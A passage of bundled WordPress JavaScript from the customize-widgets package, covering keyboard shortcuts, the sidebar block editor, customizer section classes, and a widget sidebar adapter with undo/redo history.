    getBlockName,
    getSelectedBlockClientId,
    getBlockAttributes
  } = (0,external_wp_data_namespaceObject.useSelect)(external_wp_blockEditor_namespaceObject.store);
  const handleTextLevelShortcut = (event, level) => {
    event.preventDefault();
    const destinationBlockName = level === 0 ? 'core/paragraph' : 'core/heading';
    const currentClientId = getSelectedBlockClientId();
    if (currentClientId === null) {
      return;
    }
    const blockName = getBlockName(currentClientId);
    if (blockName !== 'core/paragraph' && blockName !== 'core/heading') {
      return;
    }
    const attributes = getBlockAttributes(currentClientId);
    const textAlign = blockName === 'core/paragraph' ? 'align' : 'textAlign';
    const destinationTextAlign = destinationBlockName === 'core/paragraph' ? 'align' : 'textAlign';
    replaceBlocks(currentClientId, (0,external_wp_blocks_namespaceObject.createBlock)(destinationBlockName, {
      level,
      content: attributes.content,
      ...{
        [destinationTextAlign]: attributes[textAlign]
      }
    }));
  };
  (0,external_wp_keyboardShortcuts_namespaceObject.useShortcut)('core/customize-widgets/undo', event => {
    undo();
    event.preventDefault();
  });
  (0,external_wp_keyboardShortcuts_namespaceObject.useShortcut)('core/customize-widgets/redo', event => {
    redo();
    event.preventDefault();
  });
  (0,external_wp_keyboardShortcuts_namespaceObject.useShortcut)('core/customize-widgets/save', event => {
    event.preventDefault();
    save();
  });
  (0,external_wp_keyboardShortcuts_namespaceObject.useShortcut)('core/customize-widgets/transform-heading-to-paragraph', event => handleTextLevelShortcut(event, 0));
  [1, 2, 3, 4, 5, 6].forEach(level => {
    //the loop is based off on a constant therefore
    //the hook will execute the same way every time
    //eslint-disable-next-line react-hooks/rules-of-hooks
    (0,external_wp_keyboardShortcuts_namespaceObject.useShortcut)(`core/customize-widgets/transform-paragraph-to-heading-${level}`, event => handleTextLevelShortcut(event, level));
  });
  return null;
}
function KeyboardShortcutsRegister() {
  const {
    registerShortcut,
    unregisterShortcut
  } = (0,external_wp_data_namespaceObject.useDispatch)(external_wp_keyboardShortcuts_namespaceObject.store);
  (0,external_wp_element_namespaceObject.useEffect)(() => {
    registerShortcut({
      name: 'core/customize-widgets/undo',
      category: 'global',
      description: (0,external_wp_i18n_namespaceObject.__)('Undo your last changes.'),
      keyCombination: {
        modifier: 'primary',
        character: 'z'
      }
    });
    registerShortcut({
      name: 'core/customize-widgets/redo',
      category: 'global',
      description: (0,external_wp_i18n_namespaceObject.__)('Redo your last undo.'),
      keyCombination: {
        modifier: 'primaryShift',
        character: 'z'
      },
      // Disable on Apple OS because it conflicts with the browser's
      // history shortcut. It's a fine alias for both Windows and Linux.
      // Since there's no conflict for Ctrl+Shift+Z on both Windows and
      // Linux, we keep it as the default for consistency.
      aliases: (0,external_wp_keycodes_namespaceObject.isAppleOS)() ? [] : [{
        modifier: 'primary',
        character: 'y'
      }]
    });
    registerShortcut({
      name: 'core/customize-widgets/save',
      category: 'global',
      description: (0,external_wp_i18n_namespaceObject.__)('Save your changes.'),
      keyCombination: {
        modifier: 'primary',
        character: 's'
      }
    });
    registerShortcut({
      name: 'core/customize-widgets/transform-heading-to-paragraph',
      category: 'block-library',
      description: (0,external_wp_i18n_namespaceObject.__)('Transform heading to paragraph.'),
      keyCombination: {
        modifier: 'access',
        character: `0`
      }
    });
    [1, 2, 3, 4, 5, 6].forEach(level => {
      registerShortcut({
        name: `core/customize-widgets/transform-paragraph-to-heading-${level}`,
        category: 'block-library',
        description: (0,external_wp_i18n_namespaceObject.__)('Transform paragraph to heading.'),
        keyCombination: {
          modifier: 'access',
          character: `${level}`
        }
      });
    });
    return () => {
      unregisterShortcut('core/customize-widgets/undo');
      unregisterShortcut('core/customize-widgets/redo');
      unregisterShortcut('core/customize-widgets/save');
    };
  }, [registerShortcut]);
  return null;
}
KeyboardShortcuts.Register = KeyboardShortcutsRegister;
/* harmony default export */ var keyboard_shortcuts = (KeyboardShortcuts);

;// CONCATENATED MODULE: ./node_modules/@wordpress/customize-widgets/build-module/components/block-appender/index.js

/**
 * WordPress dependencies
 */



function BlockAppender(props) {
  const ref = (0,external_wp_element_namespaceObject.useRef)();
  const isBlocksListEmpty = (0,external_wp_data_namespaceObject.useSelect)(select => select(external_wp_blockEditor_namespaceObject.store).getBlockCount() === 0);

  // Move the focus to the block appender to prevent focus from
  // being lost when emptying the widget area.
  (0,external_wp_element_namespaceObject.useEffect)(() => {
    if (isBlocksListEmpty && ref.current) {
      const {
        ownerDocument
      } = ref.current;
      if (!ownerDocument.activeElement || ownerDocument.activeElement === ownerDocument.body) {
        ref.current.focus();
      }
    }
  }, [isBlocksListEmpty]);
  return (0,external_wp_element_namespaceObject.createElement)(external_wp_blockEditor_namespaceObject.ButtonBlockAppender, {
    ...props,
    ref: ref
  });
}

;// CONCATENATED MODULE: ./node_modules/@wordpress/customize-widgets/build-module/components/sidebar-block-editor/index.js

/**
 * WordPress dependencies
 */







/**
 * Internal dependencies
 */








const {
  ExperimentalBlockCanvas: BlockCanvas
} = unlock(external_wp_blockEditor_namespaceObject.privateApis);
function SidebarBlockEditor({
  blockEditorSettings,
  sidebar,
  inserter,
  inspector
}) {
  const [isInserterOpened, setIsInserterOpened] = useInserter(inserter);
  const {
    hasUploadPermissions,
    isFixedToolbarActive,
    keepCaretInsideBlock,
    isWelcomeGuideActive
  } = (0,external_wp_data_namespaceObject.useSelect)(select => {
    var _select$canUser;
    const {
      get
    } = select(external_wp_preferences_namespaceObject.store);
    return {
      hasUploadPermissions: (_select$canUser = select(external_wp_coreData_namespaceObject.store).canUser('create', 'media')) !== null && _select$canUser !== void 0 ? _select$canUser : true,
      isFixedToolbarActive: !!get('core/customize-widgets', 'fixedToolbar'),
      keepCaretInsideBlock: !!get('core/customize-widgets', 'keepCaretInsideBlock'),
      isWelcomeGuideActive: !!get('core/customize-widgets', 'welcomeGuide')
    };
  }, []);
  const settings = (0,external_wp_element_namespaceObject.useMemo)(() => {
    let mediaUploadBlockEditor;
    if (hasUploadPermissions) {
      mediaUploadBlockEditor = ({
        onError,
        ...argumentsObject
      }) => {
        (0,external_wp_mediaUtils_namespaceObject.uploadMedia)({
          wpAllowedMimeTypes: blockEditorSettings.allowedMimeTypes,
          onError: ({
            message
          }) => onError(message),
          ...argumentsObject
        });
      };
    }
    return {
      ...blockEditorSettings,
      __experimentalSetIsInserterOpened: setIsInserterOpened,
      mediaUpload: mediaUploadBlockEditor,
      hasFixedToolbar: isFixedToolbarActive,
      keepCaretInsideBlock,
      __unstableHasCustomAppender: true
    };
  }, [hasUploadPermissions, blockEditorSettings, isFixedToolbarActive, keepCaretInsideBlock, setIsInserterOpened]);
  if (isWelcomeGuideActive) {
    return (0,external_wp_element_namespaceObject.createElement)(WelcomeGuide, {
      sidebar: sidebar
    });
  }
  return (0,external_wp_element_namespaceObject.createElement)(external_wp_element_namespaceObject.Fragment, null, (0,external_wp_element_namespaceObject.createElement)(keyboard_shortcuts.Register, null), (0,external_wp_element_namespaceObject.createElement)(SidebarEditorProvider, {
    sidebar: sidebar,
    settings: settings
  }, (0,external_wp_element_namespaceObject.createElement)(keyboard_shortcuts, {
    undo: sidebar.undo,
    redo: sidebar.redo,
    save: sidebar.save
  }), (0,external_wp_element_namespaceObject.createElement)(header, {
    sidebar: sidebar,
    inserter: inserter,
    isInserterOpened: isInserterOpened,
    setIsInserterOpened: setIsInserterOpened,
    isFixedToolbarActive: isFixedToolbarActive
  }), (0,external_wp_element_namespaceObject.createElement)(external_wp_blockEditor_namespaceObject.BlockTools, null, (0,external_wp_element_namespaceObject.createElement)(BlockCanvas, {
    shouldIframe: false,
    styles: settings.defaultEditorStyles,
    height: "100%"
  }, (0,external_wp_element_namespaceObject.createElement)(external_wp_blockEditor_namespaceObject.BlockList, {
    renderAppender: BlockAppender
  }))), (0,external_wp_element_namespaceObject.createPortal)(
  // This is a temporary hack to prevent button component inside <BlockInspector>
  // from submitting form when type="button" is not specified.
  (0,external_wp_element_namespaceObject.createElement)("form", {
    onSubmit: event => event.preventDefault()
  }, (0,external_wp_element_namespaceObject.createElement)(external_wp_blockEditor_namespaceObject.BlockInspector, null)), inspector.contentContainer[0])), (0,external_wp_element_namespaceObject.createElement)(external_wp_blockEditor_namespaceObject.__unstableBlockSettingsMenuFirstItem, null, ({
    onClose
  }) => (0,external_wp_element_namespaceObject.createElement)(block_inspector_button, {
    inspector: inspector,
    closeMenu: onClose
  })));
}

;// CONCATENATED MODULE: ./node_modules/@wordpress/customize-widgets/build-module/components/sidebar-controls/index.js

/**
 * WordPress dependencies
 */

const SidebarControlsContext = (0,external_wp_element_namespaceObject.createContext)();
function SidebarControls({
  sidebarControls,
  activeSidebarControl,
  children
}) {
  const context = (0,external_wp_element_namespaceObject.useMemo)(() => ({
    sidebarControls,
    activeSidebarControl
  }), [sidebarControls, activeSidebarControl]);
  return (0,external_wp_element_namespaceObject.createElement)(SidebarControlsContext.Provider, {
    value: context
  }, children);
}
function useSidebarControls() {
  const {
    sidebarControls
  } = (0,external_wp_element_namespaceObject.useContext)(SidebarControlsContext);
  return sidebarControls;
}
function useActiveSidebarControl() {
  const {
    activeSidebarControl
  } = (0,external_wp_element_namespaceObject.useContext)(SidebarControlsContext);
  return activeSidebarControl;
}

;// CONCATENATED MODULE: ./node_modules/@wordpress/customize-widgets/build-module/components/customize-widgets/use-clear-selected-block.js
/**
 * WordPress dependencies
 */




/**
 * We can't just use <BlockSelectionClearer> because the customizer has
 * many root nodes rather than just one in the post editor.
 * We need to listen to the focus events in all those roots, and also in
 * the preview iframe.
 * This hook will clear the selected block when focusing outside the editor,
 * with a few exceptions:
 * 1. Focusing on popovers.
 * 2. Focusing on the inspector.
 * 3. Focusing on any modals/dialogs.
 * These cases are normally triggered by user interactions from the editor,
 * not by explicitly focusing outside the editor, hence no need for clearing.
 *
 * @param {Object} sidebarControl The sidebar control instance.
 * @param {Object} popoverRef     The ref object of the popover node container.
 */
function useClearSelectedBlock(sidebarControl, popoverRef) {
  const {
    hasSelectedBlock,
    hasMultiSelection
  } = (0,external_wp_data_namespaceObject.useSelect)(external_wp_blockEditor_namespaceObject.store);
  const {
    clearSelectedBlock
  } = (0,external_wp_data_namespaceObject.useDispatch)(external_wp_blockEditor_namespaceObject.store);
  (0,external_wp_element_namespaceObject.useEffect)(() => {
    if (popoverRef.current && sidebarControl) {
      const inspector = sidebarControl.inspector;
      const container = sidebarControl.container[0];
      const ownerDocument = container.ownerDocument;
      const ownerWindow = ownerDocument.defaultView;
      function handleClearSelectedBlock(element) {
        if (
        // 1. Make sure there are blocks being selected.
        (hasSelectedBlock() || hasMultiSelection()) &&
        // 2. The element should exist in the DOM (not deleted).
        element && ownerDocument.contains(element) &&
        // 3. It should also not exist in the container, the popover, nor the dialog.
        !container.contains(element) && !popoverRef.current.contains(element) && !element.closest('[role="dialog"]') &&
        // 4. The inspector should not be opened.
        !inspector.expanded()) {
          clearSelectedBlock();
        }
      }

      // Handle mouse down in the same document.
      function handleMouseDown(event) {
        handleClearSelectedBlock(event.target);
      }
      // Handle focusing outside the current document, like to iframes.
      function handleBlur() {
        handleClearSelectedBlock(ownerDocument.activeElement);
      }
      ownerDocument.addEventListener('mousedown', handleMouseDown);
      ownerWindow.addEventListener('blur', handleBlur);
      return () => {
        ownerDocument.removeEventListener('mousedown', handleMouseDown);
        ownerWindow.removeEventListener('blur', handleBlur);
      };
    }
  }, [popoverRef, sidebarControl, hasSelectedBlock, hasMultiSelection, clearSelectedBlock]);
}

;// CONCATENATED MODULE: ./node_modules/@wordpress/customize-widgets/build-module/components/customize-widgets/index.js

/**
 * WordPress dependencies
 */



/**
 * Internal dependencies
 */





function CustomizeWidgets({
  api,
  sidebarControls,
  blockEditorSettings
}) {
  const [activeSidebarControl, setActiveSidebarControl] = (0,external_wp_element_namespaceObject.useState)(null);
  const parentContainer = document.getElementById('customize-theme-controls');
  const popoverRef = (0,external_wp_element_namespaceObject.useRef)();
  useClearSelectedBlock(activeSidebarControl, popoverRef);
  (0,external_wp_element_namespaceObject.useEffect)(() => {
    const unsubscribers = sidebarControls.map(sidebarControl => sidebarControl.subscribe(expanded => {
      if (expanded) {
        setActiveSidebarControl(sidebarControl);
      }
    }));
    return () => {
      unsubscribers.forEach(unsubscriber => unsubscriber());
    };
  }, [sidebarControls]);
  const activeSidebar = activeSidebarControl && (0,external_wp_element_namespaceObject.createPortal)((0,external_wp_element_namespaceObject.createElement)(ErrorBoundary, null, (0,external_wp_element_namespaceObject.createElement)(SidebarBlockEditor, {
    key: activeSidebarControl.id,
    blockEditorSettings: blockEditorSettings,
    sidebar: activeSidebarControl.sidebarAdapter,
    inserter: activeSidebarControl.inserter,
    inspector: activeSidebarControl.inspector
  })), activeSidebarControl.container[0]);

  // We have to portal this to the parent of both the editor and the inspector,
  // so that the popovers will appear above both of them.
  const popover = parentContainer && (0,external_wp_element_namespaceObject.createPortal)((0,external_wp_element_namespaceObject.createElement)("div", {
    className: "customize-widgets-popover",
    ref: popoverRef
  }, (0,external_wp_element_namespaceObject.createElement)(external_wp_components_namespaceObject.Popover.Slot, null)), parentContainer);
  return (0,external_wp_element_namespaceObject.createElement)(external_wp_components_namespaceObject.SlotFillProvider, null, (0,external_wp_element_namespaceObject.createElement)(SidebarControls, {
    sidebarControls: sidebarControls,
    activeSidebarControl: activeSidebarControl
  }, (0,external_wp_element_namespaceObject.createElement)(FocusControl, {
    api: api,
    sidebarControls: sidebarControls
  }, activeSidebar, popover)));
}

;// CONCATENATED MODULE: ./node_modules/@wordpress/customize-widgets/build-module/controls/inspector-section.js
function getInspectorSection() {
  const {
    wp: {
      customize
    }
  } = window;
  return class InspectorSection extends customize.Section {
    constructor(id, options) {
      super(id, options);
      this.parentSection = options.parentSection;
      this.returnFocusWhenClose = null;
      this._isOpen = false;
    }
    get isOpen() {
      return this._isOpen;
    }
    set isOpen(value) {
      this._isOpen = value;
      this.triggerActiveCallbacks();
    }
    ready() {
      this.contentContainer[0].classList.add('customize-widgets-layout__inspector');
    }
    isContextuallyActive() {
      return this.isOpen;
    }
    onChangeExpanded(expanded, args) {
      super.onChangeExpanded(expanded, args);
      if (this.parentSection && !args.unchanged) {
        if (expanded) {
          this.parentSection.collapse({
            manualTransition: true
          });
        } else {
          this.parentSection.expand({
            manualTransition: true,
            completeCallback: () => {
              // Return focus after finishing the transition.
              if (this.returnFocusWhenClose && !this.contentContainer[0].contains(this.returnFocusWhenClose)) {
                this.returnFocusWhenClose.focus();
              }
            }
          });
        }
      }
    }
    open({
      returnFocusWhenClose
    } = {}) {
      this.isOpen = true;
      this.returnFocusWhenClose = returnFocusWhenClose;
      this.expand({
        allowMultiple: true
      });
    }
    close() {
      this.collapse({
        allowMultiple: true
      });
    }
    collapse(options) {
      // Overridden collapse() function. Mostly call the parent collapse(), but also
      // move our .isOpen to false.
      // Initially, I tried tracking this with onChangeExpanded(), but it doesn't work
      // because the block settings sidebar is a layer "on top of" the G editor sidebar.
      //
      // For example, when closing the block settings sidebar, the G
      // editor sidebar would display, and onChangeExpanded in
      // inspector-section would run with expanded=true, but I want
      // isOpen to be false when the block settings is closed.
      this.isOpen = false;
      super.collapse(options);
    }
    triggerActiveCallbacks() {
      // Manually fire the callbacks associated with moving this.active
      // from false to true.  "active" is always true for this section,
      // and "isContextuallyActive" reflects if the block settings
      // sidebar is currently visible, that is, it has replaced the main
      // Gutenberg view.
      // The WP customizer only checks ".isContextuallyActive()" when
      // ".active" changes values. But our ".active" never changes value.
      // The WP customizer never foresaw a section being used a way we
      // fit the block settings sidebar into a section. By manually
      // triggering the "this.active" callbacks, we force the WP
      // customizer to query our .isContextuallyActive() function and
      // update its view of our status.
      this.active.callbacks.fireWith(this.active, [false, true]);
    }
  };
}

;// CONCATENATED MODULE: ./node_modules/@wordpress/customize-widgets/build-module/controls/sidebar-section.js
/**
 * WordPress dependencies
 */


/**
 * Internal dependencies
 */

const getInspectorSectionId = sidebarId => `widgets-inspector-${sidebarId}`;
function getSidebarSection() {
  const {
    wp: {
      customize
    }
  } = window;
  const reduceMotionMediaQuery = window.matchMedia('(prefers-reduced-motion: reduce)');
  let isReducedMotion = reduceMotionMediaQuery.matches;
  reduceMotionMediaQuery.addEventListener('change', event => {
    isReducedMotion = event.matches;
  });
  return class SidebarSection extends customize.Section {
    ready() {
      const InspectorSection = getInspectorSection();
      this.inspector = new InspectorSection(getInspectorSectionId(this.id), {
        title: (0,external_wp_i18n_namespaceObject.__)('Block Settings'),
        parentSection: this,
        customizeAction: [(0,external_wp_i18n_namespaceObject.__)('Customizing'), (0,external_wp_i18n_namespaceObject.__)('Widgets'), this.params.title].join(' ▸ ')
      });
      customize.section.add(this.inspector);
      this.contentContainer[0].classList.add('customize-widgets__sidebar-section');
    }
    hasSubSectionOpened() {
      return this.inspector.expanded();
    }
    onChangeExpanded(expanded, _args) {
      const controls = this.controls();
      const args = {
        ..._args,
        completeCallback() {
          controls.forEach(control => {
            control.onChangeSectionExpanded?.(expanded, args);
          });
          _args.completeCallback?.();
        }
      };
      if (args.manualTransition) {
        if (expanded) {
          this.contentContainer.addClass(['busy', 'open']);
          this.contentContainer.removeClass('is-sub-section-open');
          this.contentContainer.closest('.wp-full-overlay').addClass('section-open');
        } else {
          this.contentContainer.addClass(['busy', 'is-sub-section-open']);
          this.contentContainer.closest('.wp-full-overlay').addClass('section-open');
          this.contentContainer.removeClass('open');
        }
        const handleTransitionEnd = () => {
          this.contentContainer.removeClass('busy');
          args.completeCallback();
        };
        if (isReducedMotion) {
          handleTransitionEnd();
        } else {
          this.contentContainer.one('transitionend', handleTransitionEnd);
        }
      } else {
        super.onChangeExpanded(expanded, args);
      }
    }
  };
}

;// CONCATENATED MODULE: ./node_modules/@wordpress/customize-widgets/build-module/components/sidebar-block-editor/sidebar-adapter.js
/**
 * Internal dependencies
 */

const {
  wp
} = window;
function parseWidgetId(widgetId) {
  const matches = widgetId.match(/^(.+)-(\d+)$/);
  if (matches) {
    return {
      idBase: matches[1],
      number: parseInt(matches[2], 10)
    };
  }

  // Likely an old single widget.
  return {
    idBase: widgetId
  };
}
function widgetIdToSettingId(widgetId) {
  const {
    idBase,
    number
  } = parseWidgetId(widgetId);
  if (number) {
    return `widget_${idBase}[${number}]`;
  }
  return `widget_${idBase}`;
}

/**
 * This is a custom debounce function to call different callbacks depending on
 * whether it's the _leading_ call or not.
 *
 * @param {Function} leading  The callback that gets called first.
 * @param {Function} callback The callback that gets called after the first time.
 * @param {number}   timeout  The debounced time in milliseconds.
 * @return {Function} The debounced function.
 */
function debounce(leading, callback, timeout) {
  let isLeading = false;
  let timerID;
  function debounced(...args) {
    const result = (isLeading ? callback : leading).apply(this, args);
    isLeading = true;
    clearTimeout(timerID);
    timerID = setTimeout(() => {
      isLeading = false;
    }, timeout);
    return result;
  }
  debounced.cancel = () => {
    isLeading = false;
    clearTimeout(timerID);
  };
  return debounced;
}
class SidebarAdapter {
  constructor(setting, api) {
    this.setting = setting;
    this.api = api;
    this.locked = false;
    this.widgetsCache = new WeakMap();
    this.subscribers = new Set();
    this.history = [this._getWidgetIds().map(widgetId => this.getWidget(widgetId))];
    this.historyIndex = 0;
    this.historySubscribers = new Set();
    // Debounce the input for 1 second.
    this._debounceSetHistory = debounce(this._pushHistory, this._replaceHistory, 1000);
    this.setting.bind(this._handleSettingChange.bind(this));
    this.api.bind('change', this._handleAllSettingsChange.bind(this));
    this.undo = this.undo.bind(this);
    this.redo = this.redo.bind(this);
    this.save = this.save.bind(this);
  }
  subscribe(callback) {
    this.subscribers.add(callback);
    return () => {
      this.subscribers.delete(callback);
    };
  }
  getWidgets() {
    return this.history[this.historyIndex];
  }
  _emit(...args) {
    for (const callback of this.subscribers) {
      callback(...args);
    }
  }
  _getWidgetIds() {
    return this.setting.get();
  }
  _pushHistory() {
    this.history = [...this.history.slice(0, this.historyIndex + 1), this._getWidgetIds().map(widgetId => this.getWidget(widgetId))];
    this.historyIndex += 1;
    this.historySubscribers.forEach(listener => listener());
  }
  _replaceHistory() {
    this.history[this.historyIndex] = this._getWidgetIds().map(widgetId => this.getWidget(widgetId));
  }
  _handleSettingChange() {
    if (this.locked) {
      return;
    }
    const prevWidgets = this.getWidgets();
    this._pushHistory();
    this._emit(prevWidgets, this.getWidgets());
  }
  _handleAllSettingsChange(setting) {
    if (this.locked) {
      return;
    }
    if (!setting.id.startsWith('widget_')) {
      return;
    }
    const widgetId = settingIdToWidgetId(setting.id);
    if (!this.setting.get().includes(widgetId)) {
      return;
    }
    const prevWidgets = this.getWidgets();
    this._pushHistory();
    this._emit(prevWidgets, this.getWidgets());
  }
  _createWidget(widget) {
    const widgetModel = wp.customize.Widgets.availableWidgets.findWhere({
      id_base: widget.idBase
    });
    let number = widget.number;
    if (widgetModel.get('is_multi') && !number) {
      widgetModel.set('multi_number', widgetModel.get('multi_number') + 1);
      number = widgetModel.get('multi_number');
    }
    const settingId = number ? `widget_${widget.idBase}[${number}]` : `widget_${widget.idBase}`;
    const settingArgs = {
      transport: wp.customize.Widgets.data.selectiveRefreshableWidgets[widgetModel.get('id_base')] ? 'postMessage' : 'refresh',
      previewer: this.setting.previewer
    };
    const setting = this.api.create(settingId, settingId, '', settingArgs);
    setting.set(widget.instance);
    const widgetId = settingIdToWidgetId(settingId);
    return widgetId;
  }
  _removeWidget(widget) {
    const settingId = widgetIdToSettingId(widget.id);
    const setting = this.api(settingId);
    if (setting) {
      const instance = setting.get();
      this.widgetsCache.delete(instance);
    }
    this.api.remove(settingId);
  }
  _updateWidget(widget) {
    const prevWidget = this.getWidget(widget.id);

    // Bail out update if nothing changed.
    if (prevWidget === widget) {
      return widget.id;
    }

    // Update existing setting if only the widget's instance changed.
    if (prevWidget.idBase && widget.idBase && prevWidget.idBase === widget.idBase) {
      const settingId = widgetIdToSettingId(widget.id);
      this.api(settingId).set(widget.instance);
      return widget.id;
    }

    // Otherwise delete and re-create.
    this._removeWidget(widget);
    return this._createWidget(widget);
  }
  getWidget(widgetId) {
    if (!widgetId) {
      return null;
    }
    const {
      idBase,
      number
    } = parseWidgetId(widgetId);
    const settingId = widgetIdToSettingId(widgetId);
    const setting = this.api(settingId);
    if (!setting) {
      return null;
    }
    const instance = setting.get();
    if (this.widgetsCache.has(instance)) {
      return this.widgetsCache.get(instance);
    }
    const widget = {
      id: widgetId,
      idBase,
      number,
      instance
    };
    this.widgetsCache.set(instance, widget);
    return widget;
  }
  _updateWidgets(nextWidgets) {
    this.locked = true;
    const addedWidgetIds = [];
    const nextWidgetIds = nextWidgets.map(nextWidget => {
      if (nextWidget.id && this.getWidget(nextWidget.id)) {
        addedWidgetIds.push(null);
        return this._updateWidget(nextWidget);
      }
      const widgetId = this._createWidget(nextWidget);
      addedWidgetIds.push(widgetId);
      return widgetId;
    });
    const deletedWidgets = this.getWidgets().filter(widget => !nextWidgetIds.includes(widget.id));
    deletedWidgets.forEach(widget => this._removeWidget(widget));
    this.setting.set(nextWidgetIds);
    this.locked = false;
    return addedWidgetIds;
  }
  setWidgets(nextWidgets) {
    const addedWidgetIds = this._updateWidgets(nextWidgets);
    this._debounceSetHistory();
    return addedWidgetIds;
  }

  /**
   * Undo/Redo related features
   */
  hasUndo() {
    return this.historyIndex > 0;
  }
  hasRedo() {
    return this.historyIndex < this.history.length - 1;
  }
  _seek(historyIndex) {
    const currentWidgets = this.getWidgets();
    this.historyIndex = historyIndex;
    const widgets = this.history[this.historyIndex];
    this._updateWidgets(widgets);
    this._emit(currentWidgets, this.getWidgets());
    this.historySubscribers.forEach(listener => listener());
    this._debounceSetHistory.cancel();
  }
  undo() {
    if (!this.hasUndo()) {
      return;
    }
    this._seek(this.historyIndex - 1);
  }
  redo() {
    if (!this.hasRedo()) {
      return;
    }
    this._seek(this.historyIndex + 1);
  }
  subscribeHistory(listener) {
    this.historySubscribers.add(listener);
    return () => {
      this.historySubscribers.delete(listener);
    };
  }
  save() {
    this.api.previewer.save();
  }
}

;// CONCATENATED MODULE: external ["wp","dom"]
var external_wp_dom_namespaceObject = window["wp"]["dom"];
;// CONCATENATED MODULE: ./node_modules/@wordpress/customize-widgets/build-module/controls/inserter-outer-section.js
/**
 * WordPress dependencies
 */




/**
 * Internal dependencies
 */

function getInserterOuterSection() {
  const {
    wp: {
      customize
    }
  } = window;
  const OuterSection = customize.OuterSection;
  // Override the OuterSection class to handle multiple outer sections.
  // It closes all the other outer sections whenever one is opened.
  // The result is that at most one outer section can be opened at the same time.
  customize.OuterSection = class extends OuterSection {
    onChangeExpanded(expanded, args) {
      if (expanded) {
        customize.section.each(section => {
          if (section.params.type === 'outer' && section.id !== this.id) {
            if (section.expanded()) {
              section.collapse();
            }
          }
        });
      }
      return super.onChangeExpanded(expanded, args);
    }
  };
  // Handle constructor so that "params.type" can be correctly pointed to "outer".
  customize.sectionConstructor.outer = customize.OuterSection;
  return class InserterOuterSection extends customize.OuterSection {
    constructor(...args) {
      super(...args);

      // This is necessary since we're creating a new class which is not identical to the original OuterSection.
      // @See https://github.com/WordPress/wordpress-develop/blob/42b05c397c50d9dc244083eff52991413909d4bd/src/js/_enqueues/wp/customize/controls.js#L1427-L1436
      this.params.type = 'outer';
      this.activeElementBeforeExpanded = null;
      const ownerWindow = this.contentContainer[0].ownerDocument.defaultView;

      // Handle closing the inserter when pressing the Escape key.
      ownerWindow.addEventListener('keydown', event => {
        if (this.expanded() && (event.keyCode === external_wp_keycodes_namespaceObject.ESCAPE || event.code === 'Escape') && !event.defaultPrevented) {
          event.preventDefault();
          event.stopPropagation();
          (0,external_wp_data_namespaceObject.dispatch)(store).setIsInserterOpened(false);
        }
      },
      // Use capture mode to make this run before other event listeners.
      true);
      this.contentContainer.addClass('widgets-inserter');

      // Set a flag if the state is being changed from open() or close().
      // Don't propagate the event if it's an internal action to prevent infinite loop.
      this.isFromInternalAction = false;
      this.expanded.bind(() => {
        if (!this.isFromInternalAction) {
          // Propagate the event to React to sync the state.
          (0,external_wp_data_namespaceObject.dispatch)(store).setIsInserterOpened(this.expanded());
        }
        this.isFromInternalAction = false;
      });
    }
    open() {
      if (!this.expanded()) {
        const contentContainer = this.contentContainer[0];
        this.activeElementBeforeExpanded = contentContainer.ownerDocument.activeElement;
        this.isFromInternalAction = true;
        this.expand({
          completeCallback() {
            // We have to do this in a "completeCallback" or else the elements will not yet be visible/tabbable.
            // The first one should be the close button,
            // we want to skip it and choose the second one instead, which is the search box.
            const searchBox = external_wp_dom_namespaceObject.focus.tabbable.find(contentContainer)[1];
            if (searchBox) {
              searchBox.focus();
            }
          }
        });
      }
    }
    close() {
      if (this.expanded()) {
        const contentContainer = this.contentContainer[0];
        const activeElement = contentContainer.ownerDocument.activeElement;
        this.isFromInternalAction = true;
        this.collapse({
          completeCallback() {
            // Return back the focus when closing the inserter.
            // Only do this if the active element which triggers the action is inside the inserter,
            // (the close button for instance). In that case the focus will be lost.
            // Otherwise, we don't hijack the focus when the user is focusing on other elements
            // (like the quick inserter).
            if (contentContainer.contains(activeElement)) {
              // Return back the focus when closing the inserter.
              if (this.activeElementBeforeExpanded) {
                this.activeElementBeforeExpanded.focus();
              }
            }
          }
        });
      }
    }
  };
}

;// CONCATENATED MODULE: ./node_modules/@wordpress/customize-widgets/build-module/controls/sidebar-control.js
/**
 * WordPress dependencies
 */


/**
 * Internal dependencies
 */



const getInserterId = controlId => `widgets-inserter-${controlId}`;
function getSidebarControl() {
  const {
    wp: {
      customize
    }
  } = window;
  return class SidebarControl extends customize.Control {
    constructor(...args) {
      super(...args);
      this.subscribers = new Set();
    }
    ready() {
      const InserterOuterSection = getInserterOuterSection();
      this.inserter = new InserterOuterSection(getInserterId(this.id), {});
      customize.section.add(this.inserter);
      this.sectionInstance = customize.section(this.section());
      this.inspector = this.sectionInstance.inspector;
      this.sidebarAdapter = new SidebarAdapter(this.setting, customize);
    }
    subscribe(callback) {
      this.subscribers.add(callback);
      return () => {
        this.subscribers.delete(callback);
      };
    }
    onChangeSectionExpanded(expanded, args) {
      if (!args.unchanged) {
        // Close the inserter when the section collapses.
        if (!expanded) {
          (0,external_wp_data_namespaceObject.dispatch)(store).setIsInserterOpened(false);
        }
        this.subscribers.forEach(subscriber => subscriber(expanded, args));
      }
    }
  };
}

;// CONCATENATED MODULE: ./node_modules/@wordpress/customize-widgets/build-module/filters/move-to-sidebar.js

/**
 * WordPress dependencies
 */






/**
 * Internal dependencies
 */



const withMoveToSidebarToolbarItem = (0,external_wp_compose_namespaceObject.createHigherOrderComponent)(BlockEdit => props => {
  let widgetId = (0,external_wp_widgets_namespaceObject.getWidgetIdFromBlock)(props);
  const sidebarControls = useSidebarControls();
  const activeSidebarControl = useActiveSidebarControl();
  const hasMultipleSidebars = sidebarControls?.length > 1;
  const blockName = props.name;
  const clientId = props.clientId;
  const canInsertBlockInSidebar = (0,external_wp_data_namespaceObject.useSelect)(select => {
    // Use an empty string to represent the root block list, which
    // in the customizer editor represents a sidebar/widget area.
    return select(external_wp_blockEditor_namespaceObject.store).canInsertBlockType(blockName, '');
  }, [blockName]);
  const block = (0,external_wp_data_namespaceObject.useSelect)(select => select(external_wp_blockEditor_namespaceObject.store).getBlock(clientId), [clientId]);
  const {
    removeBlock
  } = (0,external_wp_data_namespaceObject.useDispatch)(external_wp_blockEditor_namespaceObject.store);
  const [, focusWidget] = useFocusControl();
  function moveToSidebar(sidebarControlId) {
    const newSidebarControl = sidebarControls.find(sidebarControl => sidebarControl.id === sidebarControlId);
    if (widgetId) {
      /**
       * If there's a widgetId, move it to the other sidebar.
       */
      const oldSetting = activeSidebarControl.setting;
      const newSetting = newSidebarControl.setting;
      oldSetting(oldSetting().filter(id => id !== widgetId));
      newSetting([...newSetting(), widgetId]);
    } else {
      /**
       * If there isn't a widgetId, it's most likely a inner block.
       * First, remove the block in the original sidebar,
       * then, create a new widget in the new sidebar and get back its widgetId.
       */
